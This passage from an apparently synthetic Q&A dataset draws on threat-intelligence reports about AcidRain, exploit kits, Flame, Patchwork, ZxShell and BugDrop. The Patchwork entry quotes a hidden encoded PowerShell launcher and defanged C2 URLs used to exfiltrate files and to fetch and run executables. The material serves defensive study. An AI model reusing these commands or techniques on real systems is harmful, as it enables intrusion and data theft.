simultaneously\". Viasat goes on to add that \"these destructive commands overwrote key data in flash memory on the modems, rendering the modems unable to access the network, but not permanently unusable\".\nIt remains unclear how legitimate commands could have such a disruptive effect on the modems. Scalable disruption is more plausibly achieved by pushing an update, script, or executable. It's also hard to envision how legitimate commands would enable either the DoS effects or render the devices unusable but not permanently bricked.\nIn effect, the preliminary Viasat incident report posits the following requirements:\n1. Could be pushed via the KA-SAT management segment onto modems en masse\n2. Would overwrite key data in the modem's flash memory\n3. Render the devices unusable, in need of a factory reset or replacement but not permanently unusable.\nWith those requirements in mind, we postulate an alternative hypothesis: The threat actor used the KA-SAT management mechanism in a supply-chain attack to push a wiper designed for modems and routers. A wiper for this kind of device would overwrite key data in the modem's flash memory, rendering it inoperable and in need of reflashing or replacing.\nSubsequent to this post begin published, Viasat  to journalists that our analysis was consistent with their reports.\nViasat told (<https://www.bleepingcomputer.com/news/security/viasat-confirms-satellite-modems-were-wiped-with-acidrain-malware/>)BleepingComputer that \"\"The analysis in the SentinelLabs report regarding the ukrop binary is consistent with the facts in our report \u2013 specifically, SentinelLabs identifies the destructive executable that was run on the modems using a legitimate management command as Viasat previously described\".\nBig Headline: The AcidRain Wiper\nOn Tuesday, March 15th, 2022, a suspicious upload caught our attention. A MIPS ELF binary was uploaded to VirusTotal from Italy with the name 'ukrop'. We didn't know how to parse the name accurately. Possible interpretations include a shorthand for \"ukr\"aine \"op\"eration, the acronym for the Ukrainian Association of Patriots, or a Russian ethnic slur for Ukrainians \u2013 '(<https://en.wikipedia.org/wiki/Ukrop#:~:text=Ukrop%20(Russian%3A%20%D0%A3%D0%BA%D1%80%D0%BE%D0%BF%3B%20literally,the%20Russian%20word%20for%20Ukrainians.>)\u0423\u043a\u0440\u043e\u043f'. Only the incident responders in the Viasat case could say definitively whether this was in fact the malware used in this particular incident. We posit its use as a fitting hypothesis and will describe its functionality, quirky development traits, and possible overlaps with previous Russian operations in need of further research.\nBig Headline: An Interesting Oddity\nDespite what the Ukraine invasion has taught us, wiper malware is relatively rare. More so wiper malware aimed at routers, modems, or IoT devices. The most notable case is VPNFilter, a modular malware aimed at SOHO routers and QNAP storage devices, discovered by . This was followed by an  attributing the operation to Russia (APT28, in particular). More recently, the NSA and CISA attributed VPNFilter to Sandworm (a different threat actor attributed to the same organization, the Russian GRU) as (<https://www.ncsc.gov.uk/files/Cyclops-Blink-Malware-Analysis-Report.pdf>)the U.K.'s National Cyber Security Centre (NCSC) described VPNFilter's successor, Cyclops .\nVPNFilter included an impressive array of functionality in the form of multi-stage plugins selectively deployed to the infected devices. The functionality ranges from credential theft to monitoring Modbus SCADA protocols. Among its many plugins, it also included functionality to wipe and brick devices (<https://blog.talosintelligence.com/2018/09/vpnfilter-part-3.html>)as well as DDoS a target.\nThe reason we bring up the specter of VPNFilter is not because of its superficial similarities to AcidRain but rather because of an interesting (but inconclusive) code overlap between a specific VPNFilter plugin and AcidRain.\nBig Headline: VPNFilter Stage 3 Plugin \u2013 'dstr'\nAfter the initial discovery of VPNFilter, additional plugins were revealed by researchers attempting to understand the massive spread of the botnet and its many intricacies. Among these were previously unknown plugins, including 'dstr'. As the mangled name suggests, it's a 'destruction' module meant to supplement stage 2 plugins that lacked the 'kill' command meant to wipe the devices.\nThis plugin was brought to our attention initially by (<https://github.com/trendmicro/tlsh>)tlsh fuzzy hashing, a more recent matching library that's proven far more effective than ssdeep or imphash in identifying similar samples. The similarity was at 55% to AcidRain with no other samples being flagged in the VT corpus. This alone is not nearly enough to conclusively judge the two samples as tied, but it did warrant further investigation.\nVPNFilter and AcidRain are both notably similar and dissimilar. They're both MIPS ELF binaries and the bulk of their shared code appears to stem from statically-linked libc. It appears that they may also share a compiler, most clearly evidenced by the identical Section Headers Strings Tables.\nSection Headers Strings Tables for VPNFilter and AcidRain\nAnd there are other development quirks, such as the storing of the previous syscall number to a global location before a new syscall. At this time, we can't judge whether this is a shared compiler optimization or a strange developer quirk.\nMore notably, while VPNFilter and AcidRain work in very different ways, both binaries make use of the MEMGETINFO, MEMUNLOCK, and MEMERASE IOCTLS to erase mtd device files.\nOn the left, AcidRain; on the right, VPNFilter\nThere are also notable differences between VPNFilter's 'dstr' plugin and AcidRain. The latter appears to be a far sloppier product that doesn't consistently rise to the coding standards of the former. For example, note the redundant use of process forking and needless repetition\nof operations.\nThey also appear to serve different purposes, with the VPNFilter plugin targeting specific devices with hardcoded paths, and AcidRain taking more of a \"one-binary-fits-all\" approach to wiping devices. By brute forcing device filenames, the attackers can more readily reuse AcidRain against more diverse targets.\nWe invite the research community to stress test this developmental overlap and contribute their own findings.\nAnswer this question: How does the AcidRain wiper malware fit into the broader context of cyber operations during the Russian invasion of Ukraine, and what other wiper malware strains were observed during this period?",
    "output": "AcidRain is the 7th wiper malware associated with the Russian invasion of Ukraine, highlighting the extensive use of cyber operations in modern warfare. Other wiper malware strains observed during this period include WhisperKill, WhisperGate, HermeticWiper, IsaacWiper, CaddyWiper, and DoubleZero. These attacks demonstrate the abundance of cyber operations accompanying conventional warfare, with AcidRain standing out for its impact on satellite modems and subsequent spillover effects on German critical infrastructure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Exploit families\nFigure 28. Quarterly encounter rate trends for the exploit families most commonly detected and blocked by Microsoft real-time antimalware products in 1H15, shaded according to relative prevalence\nTotals for individual vulnerabilities do not include exploits that were detected as part of exploit kits.\n\uf0b7 Exploit kits accounted for six of the 10 most commonly encountered exploits during 1H15. See (<>)\"Exploit kits\" on page (<>)44 for more information about exploit kits.\n\uf0b7 Exploits targeting the Java Runtime Environment (JRE) have gone from seven of the top 10 individual exploits detected in 2H13 to none in 1H15. A number of changes that were made to Java and Internet Explorer over the past two years have made it much more difficult for attackers to take advantage of Java-based vulnerabilities, which is the most likely explanation for this significant decrease. (See (<>)\"Java exploits\" on page (<>)47 for more information.)\n\uf0b7 the issue, and Windows 8 and Windows 8.1 have never been vulnerable to exploits of CVE-2010-2568.\n\uf0b7 \uf0b7\nMedium Headline: Exploit kits\nExploit kits are collections of exploits bundled together and sold as commercial software or as a service. Prospective attackers buy or rent exploit kits on malicious hacker forums and through other illegitimate outlets. A typical kit comprises a collection of webpages that contain exploits for several vulnerabilities in popular web browsers and browser add-ons. When the attacker installs the kit on a malicious or compromised web server, visitors who don't have the appropriate security updates installed are at risk of having their computers compromised through drive-by download attacks. (See page (<>)105 for more information about drive-by downloads.)\nFigure 29. How a typical exploit kit works\nMicrosoft security products detect and block the characteristic techniques that a number of common exploit kits use to infect computers, along with several generic HTML and JavaScript exploit techniques. (<>)Figure 30 shows the prevalence of several top web-based exploit kits and techniques during each of the four most recent quarters.\nFigure 30. Trends for the top exploit kit-related threats detected and blocked by Microsoft real-time antimalware products in 1H15\n\uf0b7 Exploit kit authors update the exploits they use frequently, adding exploits for newly discovered vulnerabilities while dropping poorly performing ones.\n, Internet Explorer (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2551>)(CVE-2013-2551), Adobe Flash Player (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8439>)(CVE-2014-8439, (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0311>)CVE-2015-0311, and (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0313>)CVE-2015-0313, among others), and Java (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2460>)(CVE-2013-2460), although exploit kit authors frequently change the exploits included in their kits in an effort to stay ahead of software publishers and security software vendors.\n\uf0b7 After decreasing to low levels in 2H14, detections of the Nuclear exploit kit (detected as (<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=JS/Neclu>)JS/Neclu) reversed course and began trending upward in 2015, making it the second most commonly encountered exploit kit in 2Q15.\n\uf0b7 Encounters involving the Sweet Orange and Fiesta exploit kits (detected as (<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=Win32/Anogre>)Win32/Anogre and (<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=JS/Fiexp>)JS/Fiexp,\nrespectively), the second and third most commonly encountered exploit kits in 2H14, decreased to much lower levels in 1H15.\nExploit kit authors update the exploits they use frequently, adding exploits for newly discovered vulnerabilities while dropping poorly performing ones. (<>)Figure\nFigure 31. Newly discovered exploits observed being used by exploit kits in 1H15\nMedium Headline: Java exploits\nFigure 32. Trends for the top Java exploits detected and blocked by Microsoft real-time antimalware products in 1H15\n\uf0b7 Overall, encounters with Java exploits continued to decrease significantly in 1H15. This decrease is likely caused by several important changes in the way web browsers evaluate and execute Java applets:\nIExtensionValidation in Internet Explorer 11 provides a mechanism for security software to validate that a webpage is safe before allowing instantiation of ActiveX controls.\n\uf0b7 The IExtensionValidation interface in Internet Explorer 11, released in late 2013, provides a mechanism for security software to validate that a webpage is safe before allowing instantiation of ActiveX controls, such as the control that hosts embedded Java applets.\nIf a webpage is determined to be malicious, the ActiveX controls are blocked from loading, and the actual Java exploit itself is therefore never encountered. (See (<>)\"Exploit detection with (<>)Internet Explorer and IExtensionValidation\" on page (<>)55 for more information.) Subsequent Internet Explorer security updates released in 2014 added an isolated heap mechanism and a deferred-free method to mitigate use-after-free bugs, which further hardened Internet Explorer against Java exploitation.\n\uf0b7 Beginning with Java 7 update 51, released in January 2014, the Java Runtime Environment (JRE) requires Java applets running in web browsers to be digitally signed by default.\n\uf0b7 In September 2014, Microsoft published updates for versions 8 through 11 of Internet Explorer to begin (<http://blogs.msdn.com/b/ie/archive/2014/08/06/internet-explorer-begins-blocking-out-of-date-activex-controls.aspx>)blocking out-of-date ActiveX controls, including controls that host older versions of the JRE in the browser. As explained in this section, the most commonly encountered Java exploits all target vulnerabilities that were addressed with security updates years ago, but remain present in out-of-date Java installations. When a webpage attempts to load one of the vulnerable versions of Java in Internet Explorer with the update applied, the control is blocked by default and the user is urged to update Java to a more secure version.\nFigure 33. Internet Explorer blocks out-of-date ActiveX controls from running\n\uf0b7 the same month with its (<http://www.oracle.com/technetwork/topics/security/javacpujun2012-1515912.html>)June 2012 Critical Patch Update. The vulnerability was observed being exploited in the wild beginning in early July 2012, and has been used in a number of exploit kits.\nFor more information about this exploit, see the entry (<http://blogs.technet.com/b/mmpc/archive/2012/08/01/the-rise-of-a-new-java-vulnerability-cve-2012-1723.aspx>)\"The rise of a new Java vulnerability - CVE-2012-1723\" (August 1, 2012) in the Microsoft Malware Protection Center (MMPC) blog at blogs.technet.com/mmpc.\n\uf0b7 Internet Explorer has begun blocking out-of-date ActiveX controls, including controls that host older versions of the JRE in the browser.\n\uf0b7 \uf0b7 \uf0b7 For more information about CVE-2013-0422, see the entry (<http://blogs.technet.com/b/mmpc/archive/2013/01/20/a-technical-analysis-of-a-new-java-vulnerability-cve-2013-0422.aspx>)\"A technical (<http://blogs.technet.com/b/mmpc/archive/2013/01/20/a-technical-analysis-of-a-new-java-vulnerability-cve-2013-0422.aspx>)analysis of a new Java vulnerability (CVE-2013-0422)\" (January 20, 2013) in the MMPC blog at blogs.technet.com/mmpc.\nMedium Headline: Operating system exploits\nAlthough most operating system exploits detected by Microsoft security products are designed to affect the platforms on which the security products run, malicious or infected files that affect other operating systems are sometimes downloaded. (<>)Figure 34 shows trends for the individual exploits most commonly detected and blocked or removed during each of the past four quarters.\nFigure 34. Individual operating system exploits detected and blocked by Microsoft real-time antimalware products, 3Q14\u20132Q15\n\uf0b7 \uf0b7 more information about this vulnerability and what Microsoft has done to mitigate it.\n\uf0b7 Three of the five most commonly encountered operating system exploits on Windows computers in 1H15 actually target the Android mobile operating system published by Google and the Open Handset Alliance. Microsoft security products detect these threats when Android devices or storage cards are connected to computers running Windows, or when Android users knowingly or unknowingly download infected or malicious programs to their computers before transferring the software to their devices. Most detections that affect Android involve exploits that enable an attacker or other user to obtain root privileges on vulnerable Android devices. Device owners sometimes use such exploits intentionally to gain access to additional functionality (a practice often called rooting or jailbreaking), but these exploits can also be used by attackers to infect devices with malware that bypasses many typical security systems.\n\uf0b7 Three of the five most commonly encountered operating system exploits on Windows computers in 1H15 actually target the Android mobile operating system.\n\uf0b7 \uf0b7\nQ: What specific mechanisms were introduced in Internet Explorer to mitigate Java exploitation, and how do they work?",
    "output": "Several mechanisms were introduced in Internet Explorer to mitigate Java exploitation. The IExtensionValidation interface in Internet Explorer 11, released in late 2013, allows security software to validate that a webpage is safe before permitting the instantiation of ActiveX controls, such as those that host embedded Java applets. If a webpage is deemed malicious, the ActiveX controls are blocked from loading, preventing the Java exploit from being encountered. Subsequent Internet Explorer security updates in 2014 added an isolated heap mechanism and a deferred-free method to mitigate use-after-free bugs, further enhancing the browser's resistance to Java exploitation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Flame/ Flamer/ Skywiper\nFlame is a modular malware discovered in 2012 by MAHER Center of Iranian National, Kaspersky Lab, Iran's CERT, and CrySyS Lab of Budapest University of Technology and Economics. Flame may have been active for 2-5 years prior to its 2012 discovery. Initially, malware targeted the Microsoft Windows operating system of computers that supported the Iranian nuclear program. However, Iran discovered the malware after detecting a cyber campaign against its oil industry.\nFlame is a large piece of modular malware, designed to map and monitor the target network. Flame is about 20 megabytes of code. For comparison, it is ~20 times the size of Stuxnet; though, Flame is entirely focused on espionage and is considered a predecessor to Stuxnet. The malware leverages the victim's network to provide the adversary with a steady\nstream of exfiltrated data that can be used to inform cyber and cyber-physical campaign decisions. Flame is too large and too complex to be anything except state-sponsored malware. Because of its alleged purpose, the Flame malware is attributed to a joint development program between the NSA, the CIA, and the Israeli military. Flame may have been part of a classified operation meant to monitor and slow Iran's nuclear program, code-named Olympic Games.\nTo the credit of the allegations, the Stuxnet malware was developed under similar circumstances and for similar purposes. In fact, Flame contains some of the same code as Stuxnet. According to Kaspersky senior researcher Roel Schouwenberg, \"It's very likely it's two teams working effectively on the same program but using two very different approaches.\" Supposedly, the campaign against Iranian oil industry, which led to the exposure of Flame, was a unilateral operation launched by Israel, without informing their American counterparts.\nKaspersky detected Flame malware infections in Iran, Israel, Sudan, Syria, Lebanon, Saudi Arabia, and Egypt. Significantly fewer infected systems were detected in Europe or North America. Infected systems belonged to state-related organizations, educational institutions, and individuals. Systems were compromised via spear phishing attacks, infected websites, infected USB devices, and other infected systems on the local area network. Flame targeted emails, documents, AutoCAD drawings, instant messenger logs, and Skype conversations.\nFlame is one of the first malware complex enough to be considered an attack toolkit. For years, Flame evaded detection by masquerading as a Microsoft software update. Flame creates its own backdoor, operates like a Trojan, and replicates across the local network and removable media like a worm. Flame contains many different libraries for compression (zlib, libbz2, and ppmd), for encryption (five methods total), for database manipulation (sqlite3), and a Lua virtual machine. The virtual machine is included to integrate components of Flame with C and C++ code on the host machine. Flame also contains local databases with nested SQL queries, Windows Incident Management scripting, batch scripting, and other features.\nFlame set the precedent for the typical espionage malware capabilities. Flame can log keystrokes, it can activate microphones to capture audio, it can activate cameras to capture video, it can extract geolocation data from images, and it can screenshot the display. Recorded data is compressed via a public-source library and periodically sent through the malware operator's C&C infrastructure through a covert SSL channel. Other data is similarly exfiltrated. Flame is unique (at least for 2012) in that it can activate and use Bluetooth wireless to send and receive commands and data. Through Bluetooth, infected machines can be turned into beacons or used to detect nearby Bluetooth enabled devices. Like Stuxnet, Flame can infect\nother systems on the network through shared connections such as printers. Flame can also spread to air-gapped networks via a USB drive.\nThe malware detects the antivirus on the host system and configures its modules and file names so that it has the greatest probability of remaining undetected. The malware also protects its modules with READ, WRITE, and EXECUTE permissions to make them inaccessible to user-made applications. Flame employed fake Microsoft licensing certificates to make discovered modules appear legitimate. Finally, Flame includes a Kill module that discretely removes the malware from infected systems. After public disclosure of the malware, the operators sent the kill command and removed the malware from many high profile hosts; thereby obfuscating the actual breadth of the campaign.\nMedium Headline: America's Most Elite Line of Cyber-Defense: Tailored Access Operations (TAO)\nAs the most targeted Nation in the world, The United States intelligence community has been continuously raising the bar to combat global bad actors. Tailored Access Operations is the largest operative component of the Signal Intelligence Directorate of the United States National Security Agency (NSA), consisting of over 1000 military and civilian cyber security professionals, hackers, technology specialists, and hardware and software designers. Approximately 600 of TAO's Computer Network Exploitation (CNE) operators work in rotating 24 hour, seven days a week, shifts out of the Remote Operations Center at Fort Meade.\nThe Office of Tailored Access Operations produces some of the best intelligence for the United States government and its work has been pivotal to the success of numerous operations. TAO is credited with delivering critical information to the 2007 U.S. Army operations in Iraq and in the 2007 operations to prevent Iran from obtaining nuclear weapons.\nTAO is comprised of four main divisions. The Data Network Technologies Branch develops the infiltration and collection software utilized by the TAO. The Telecommunications Network Technologies Branch curates infiltration techniques. The Mission Infrastructure Technologies Branch combines the spyware and techniques to use in campaigns and they develop and build the computer and telecommunications hardware. The Access Technologies Branch, which contains personnel seconded by the CIA and FBI, performs \"off-net operations.\" TAO is headed by U.S. Cyber Command and the director of the NSA.\nThe NSA describes TAO operations as computer network exploitation. TAO conducts counterterrorism and traditional espionage operations, but they also conduct cyber-attacks on behalf of the United States. Supposedly, TAO is able to compromise even the hardest targets. TAO is tasked with monitoring foreign entities, infiltrating their networks, and gathering information. It accomplishes its task through spyware or by compromising network devices such as routers, switches, or firewalls, and monitoring the network traffic. TAO is also tasked with developing malware or information profiles that would enable the United States to cripple foreign network infrastructure or telecommunications if directed to do so by President Obama.\nThe NSA is not authorized to conduct operations against domestic targets; however, some are concerned about the massive telecommunications monitoring programs that were revealed as a result of the Snowden leaks. The NSA monitors domestic traffic to capture communications in which at least one party originates from outside the United States. When CNE operators identify a network or system belonging to a nefarious foreign entity, they attempt to compromise its security, download a copy of its hard drive for analysis, and plant malware tools to monitor email and network traffic from the machine.\nThe main attack suite developed by the TAO and made public by the Snowden leak is dubbed QUANTUM. QUANTUM features a suite of attack tools that enable DNS injection attacks, HTTP injection attacks, and the ability to inject into MySQL connections. It also contains tools to hijack IRC and HTTP-based criminal botnets and tools to create phantom servers. The QUANTUMDEFENSE portion of the program searches tapped connections for DNS requests for NIPRnet addresses and initiates a packet-injection attack on a DNS reply to redirect the target to an NSA controlled site. This site may be a FOXACID server, which probes the victim's browser for weaknesses. The TAO can exploit any weaknesses with the QUANTUMINSERT program and seize control of the victim system. QUANTUMSMACKDOWN conducts packet injection attacks against attacks aimed at Department of Defense assets. QUANTUMCOOKIE is used to de-anonymize Tor users through web cookies and fetch requests. Finally, the QUANTUMSQIRREL program lets TAO pose as any authenticated user on virtually any site by spoofing the IPv4 or IPv6 address of the host. Through this, TAO can monitor most digital communication, create posts from a \"trusted\" account, or pose as specific users in online transactions.\nQuestion: How did Flame malware manage to evade detection for several years, and what specific techniques did it employ to remain undetected?",
    "output": "Answer: Flame malware managed to evade detection for several years by masquerading as a Microsoft software update. It detected the antivirus on the host system and configured its modules and file names to increase the likelihood of remaining undetected. Additionally, it protected its modules with READ, WRITE, and EXECUTE permissions to make them inaccessible to user-made applications. Flame also employed fake Microsoft licensing certificates to make discovered modules appear legitimate. Furthermore, it included a Kill module that discretely removed the malware from infected systems, which obfuscated the actual breadth of the campaign after public disclosure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Russian Bank Offices Hit with Broad Phishing Wave\nBy far most of the bank-related phishing campaigns described in security advisories and reports consist of bank customers being targeted for their online credentials. Much less common is a phishing campaign targeting the banks themselves. Perhaps fraudsters know that there are a lot more bank customers than there are banks, and generally banks have a more hardened security posture than the average bank's customer.\nRead the text above and answer this question: Why do you think phishing campaigns targeting banks directly are less common compared to those targeting bank customers? How does this insight help cybersecurity experts in improving their strategies against such threats?",
    "output": "Phishing campaigns targeting banks directly are less common because there are significantly fewer banks than there are bank customers, making it more efficient for fraudsters to target the larger pool of customers. Additionally, banks typically have more robust security measures in place compared to individual customers, which makes them harder targets. This insight helps cybersecurity experts by emphasizing the importance of maintaining a strong security posture and investing in advanced defenses. It also highlights the need for continuous monitoring and education to protect both the organization and its clients.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: PRIVILEGE ESCALATION\nAfter the previous stages, the payload uses a well known and as-of-yet unpatched UAC bypass vulnerability in Microsoft Windows (known as UACME8), which works on the default setup of Windows 79 . This allows the attackers to execute commands as Administrator.\nIf the AutoIt script is compiled for x86 systems (/x86 flag), the payload hides the UAC bypass vulnerability exploitation inside svchost.exe using a technique called Process Hollowing10 (UAC bypass method \u2013 'IFileOperation COM Object'11). If the AutoIt script is compiled for x64 systems (/x64 flag), the oobe12 UAC bypass method is used.\n8 https://github.com/hfiref0x/UACME\n9 According to research, also Windows 8 as claimed by Peter Kleissner, https://download.pureftpd.org/misc/UAC.cpp\n10 https://www.trustwave.com/Resources/SpiderLabs-Blog/Analyzing-Malware-Hollow-Processes\n11 https://www.greyhathacker.net/?p=796\n12 http://www.labofapenetrationtester.com/2015/09/bypassing-uac-with-powershell.html\nSmall Headline: SHELLCODE EXECUTION\nWhen the AutoIt malware's heartbeat receives a \"2\" in $sdata (this seems to be the most common scenario), the included, base64-encoded response data is decoded and executed using the command \"powershell -nop -wind hidden -noni -enc\". We observed that the base64 encoded payload was a PowerShell script that closely resembled code designed to allow x86 shellcode to run on x64 architectures13. This PowerShell script executed an additional payload, which was a PowerSploit script14 used to invoke shellcode containing a reverse HTTPS Meterpreter.\nMedium Headline: Once unpacked, the module performs these actions:\n\u2022 In order to persist past computer shutdown and power on, the payload copies itself to a system directory, renames the file to netmon.exe, and adds the executable to the startup programs as \"Net Monitor\":\nC:\\Windows\\SysWOW64\\netmon.exe - example of the final destination on 64-bit system running 7zip.exe/netmon.exe via WOW64\n\u2022 One thread scans all drive letters and exfiltrates files with certain extensions in the permanent drives (not searching network drives or USB).\nNote: this is called the GetDriveTypeA function in kernel32.dll, which caused the alert on our system.\n\u2022 Another thread is uploading files of the same formats as from the Dropper payload (see above) to hxxp://212[.]83.191.156/http/up.php.\n\u2022 Another thread downloads an executable from hxxp://212[.]83.191.156/http/down.php and executes it. We didn't observe this behavior.\n16 https://github.com/yorickdewid/MyDoom\nMedium Headline: PREVIOUSLY EXAMINED INFORMATION\nLet's examine the attribution information we have discussed thus far in this report.\nMany of the primary targets of this campaign are regional neighbors of India, and other targets seem to be targeted (by their interests, occupation, and by the content of the spear phishing) to issues affecting India. Circumstantially, this targeting correlates with intelligence requirements necessary for a pro-Indian entity.\nHowever, we felt this was not enough to draw direct conclusions. What we believe makes this correlation much stronger and hints that this is a pro-Indian or Indian entity, is the addition of time of day activity analysis as detailed below.\nMedium Headline: PPS EDIT TIME ANALYSIS17\nFollowing a review of the PPS files found on the C&C server, we extracted data concerning the time of day when each PPS file was last modified, and plotted this on a graph. Below, we can see that more editing occurred during certain hours of the day.\nNumber of edits by time of day\n17 Time zone analysis and research activity associated with daytime hours is circumstantial by definition. Some threat actors work around the clock, and manipulation of timestamps has been seen in past attacks by various threat actors. While it should be treated with due suspicion, it has also proven itself highly valuable in analysis of APT threat actors in the past and cannot be discounted.\nBased on modification times of the infecting presentation files, we see two distinct batches of work. The first, where the bulk of changes has been made, stretches from around 4:00 to 12:00 in coordinated universal time. To visualize what exactly that means, this time range was considered in the context of a standard 9am - 7pm work day and applied to a map. The \"First stretch of work\" label on the map below depicts the areas of the world in which 4:00 - 12:00 UTC would fall within the standard work day. Similarly, the time zones shaded within the \"Second stretch of work\" area are representative of the areas of the world in which 19:00 - 22:00 UTC falls within the work day. Since the time span of the second stretch of work is smaller in range, the hours in universal time fall within the working hours of more countries. Based on this map, we can conclude that it is most likely that the threat actors were based within the blue areas.\nAttacker operating times that overlap with a standard 9am-7pm workday (darker means larger volume)\nMany of the conclusions drawn from the above map were also confirmed through other sources. Extra data we were able to extract and analyze further correlated with this data, as well as with the previous PPS data.\nMedium Headline: C&C ACTIVITY TIMES\nThe time at which servers were staged was listed not only by hour, but by day of the week. After plotting these times by hour, with the day of the week specified through color coordination, we can see various patterns. It was more common for servers to be staged on certain days of the week, such as Sunday, rather than on other days, such as Saturday. These times are also clustered together in a clump for the most part, with almost no activity earlier than 2:00 UTC, and besides one exception on Sunday, not later than 11:00 UTC. This clump is very similar to the range of time specified within the first clump of time in the PPS editing graph and the \"First stretch of work\" area of the \"Threat actor working hours\" diagram.\nDisplays the number of times a server was staged by hour of day, color-coordinated by day of the week\nOther data extracted from the server included the time of day and day of the week of domain registrations. After plotting these on a graph, we observed that domains were registered only on specific days of the week. The other important feature is that all of these incidents occurred between 3:00 and 15:00 UTC, which is a slightly wider range than the first stretch of time in the PPS editing graph, but still very comparable.\nDisplays the number of domain registrations by hour of day, color-coordinated by day of the week\nExtra analysis we were able to conduct was on the compilation times, by time of day and day of the week. After plotting these on a graph, we observed that, similar to domain registrations, compilations only occurred on specific days of the week. All the events took place between 2:00 and 10:00 UTC, which is only a slight shift of the time span in the first stretch of PPS editing.\nDisplays the number of compilations by hour of day, color-coordinated by day of the week\nAll three of these graphs provide confirmation that these attacks were clustered partially by day of the week but mostly by time of day. Specifically, the time of day when staging servers, domain registration, and compilations occurred most frequently lined up with the first stretch of time seen in the PPS18 editing data. This applies to the area of the map within the \"First stretch of time\" label and adds weight to our conclusion that the threat actors live in the blue area.\nThis time of day activity data, when combined with the previous circumstantial evidence (the threat actor's intelligence requirements, the countries targeted around India, the other targets around the world, and the content of the spear phishing, directs us to the conclusion that this threat actor correlates with a location in India.\nCarefully, we feel obligated to note that further evidence suggests potential links between this threat actor and the operations known as Hangover/Appin, but this possible link is still being researched and is far from conclusive.\nThat said, attribution is tricky business and it's never possible to be entirely conclusive.\n18 Information from several partners suggests that the documents being stolen and then repurposed for spear phishing purposes also contain language indicators that support our hypothesis, but we have no direct information to support this.\nAnswer this question: How did the Patchwork APT use PowerShell scripts to execute shellcode, and what was the purpose of the PowerSploit script in this context?",
    "output": "The Patchwork APT used PowerShell scripts to execute shellcode by decoding and running base64-encoded payloads. The PowerShell script closely resembled code designed to allow x86 shellcode to run on x64 architectures. The PowerSploit script was used to invoke shellcode containing a reverse HTTPS Meterpreter, which is a payload from the Metasploit framework that provides a remote access tool (RAT) for the attackers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: This post was authored by (<http://blogs.cisco.com/author/AndreaAllievi>)Andrea Allievi, (<http://blogs.cisco.com/author/douglasgastonguaygoddard>)Douglas Goddard, (<http://blogs.cisco.com/author/shaunhurley/>)Shaun Hurley, and (<http://blogs.cisco.com/author/AlainZidouemba>)Alain Zidouemba.\nRecently, there was a (<http://blogs.cisco.com/talos/threat-spotlight-group-72/>)blog post on the takedown of a botnet used by threat actor group known as Group 72 and their involvement in Operation SMN. This group is sophisticated, well funded, and exclusively targets high profile organizations with high value intellectual property in the manufacturing, industrial, aerospace, defense, and media sector. The primary attack vectors are watering-hole, spear phishing, and other web-based attacks.\nFrequently, a remote administration tool (RAT) is used to maintain persistence within a victim's organization. These tools are used to further compromise the organization by attacking other hosts inside the targets network.\nZxShell (aka Sensocode) is a Remote Administration Tool (RAT) used by Group 72 to conduct cyber-espionage operations. Once the RAT is installed on the host it will be used to administer the client, exfiltrate data, or leverage the client as a pivot to attack an organization's internal infrastructure. Here is a short list of the types of tools included with ZxShell:\nKeylogger (used to capture passwords and other interesting data)\nCommand line shell for remote administration\nRemote desktop\nVarious network attack tools used to fingerprint and compromise other hosts on the network\nLocal user account creation tools\nFor a complete list of tools please see the MainConnectionIo section.\nThe following paper is a technical analysis on the functionality of ZxShell. The analysts involved were able to identify command and control (C2) servers, dropper and installation methods, means of persistence, and identify the attack tools that are core to the RAT's purpose. In addition, the researchers used their analysis to provide detection coverage for Snort, Fireamp, and ClamAV.\nAnswer this question: Why does Group 72 use the ZxShell (aka Sensocode) Remote Administration Tool (RAT) in their cyber-espionage operations? Explain the various functionalities of ZxShell and how these contribute to the group's objectives.",
    "output": "Group 72 uses the ZxShell (aka Sensocode) Remote Administration Tool (RAT) to conduct cyber-espionage operations because it provides a range of functionalities that support their goals of maintaining persistence within a victim's organization and further compromising the target's network. The key functionalities of ZxShell include a keylogger, which is used to capture passwords and other sensitive data; a command line shell for remote administration; a remote desktop feature; various network attack tools used to fingerprint and compromise other hosts on the network; and local user account creation tools. These tools allow Group 72 to administer the client, exfiltrate data, and leverage the client as a pivot to attack an organization's internal infrastructure. By using ZxShell, Group 72 can effectively maintain control over compromised systems and expand their reach within the target network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Examples of Operation BugDrop targets identified by CyberX so far include:\nA company that designs remote monitoring systems for oil & gas pipeline infrastructures.\nAn international organization that monitors human rights, counter-terrorism and cyberattacks on critical infrastructure in the Ukraine.\nAn engineering company that designs electrical substations, gas distribution pipelines, and water supply plants.\nA scientific research institute.\nEditors of Ukrainian newspapers.\nOperation BugDrop is a well-organized operation that employs sophisticated malware and appears to be backed by an organization with substantial resources. In particular, the operation requires a massive back-end infrastructure to store, decrypt and analyze several GB per day of unstructured data that is being captured from its targets. A large team of human analysts is also required to manually sort through captured data and process it manually and/or with Big Data-like analytics.\nInitially, CyberX saw similarities between Operation BugDrop and a previous cyber-surveillance operation discovered by ESET in May 2016 called (<http://www.welivesecurity.com/2016/05/18/groundbait/>)Operation Groundbait. However, despite some similarities in the Tactics, Techniques, and Procedures (TTPs) used by the hackers in both operations, Operation BugDrop's TTPs are\nsignificantly more sophisticated than those used in the earlier operation. For example, it uses:\nDropbox for data exfiltration, a clever approach because Dropbox traffic is typically not blocked or monitored by corporate firewalls.\nEncrypted DLLs, thereby avoiding detection by common anti-virus and sandboxing systems because they're unable to analyze encrypted files.\nOperation BugDrop infects its victims using targeted email phishing attacks and malicious macros embedded in Microsoft Office attachments. It also uses clever social engineering to trick users into enabling macros if they aren't already 